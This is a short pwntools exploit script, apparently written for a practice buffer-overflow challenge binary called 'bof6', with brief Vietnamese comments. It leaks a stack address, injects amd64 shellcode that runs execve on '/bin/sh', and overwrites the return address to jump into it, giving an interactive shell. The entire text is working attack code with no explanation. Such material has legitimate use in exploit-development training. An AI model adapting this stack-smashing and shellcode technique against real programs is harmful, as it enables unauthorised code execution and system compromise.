from pwn import *

exe = ELF("./bof6")
r = process("./bof6")

r.sendlineafter(b'> ', b'1')  # chon option 1
r.sendafter(b'> ', b'a' * 80)  # leak dia chi stack
r.recvuntil(b'a' * 80)

leak_stack = u64(r.recv(6) + b'\x00\x00')
log.info("stack leak: " + hex(leak_stack))

input()

shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    
    syscall
    ''', arch='amd64'
)
payload = shellcode
payload = payload.ljust(536 - 16)
payload += p64(leak_stack - 0x220)
r.sendlineafter(b'> ', b'2')
r.sendafter(b'> ', payload)
r.interactive()
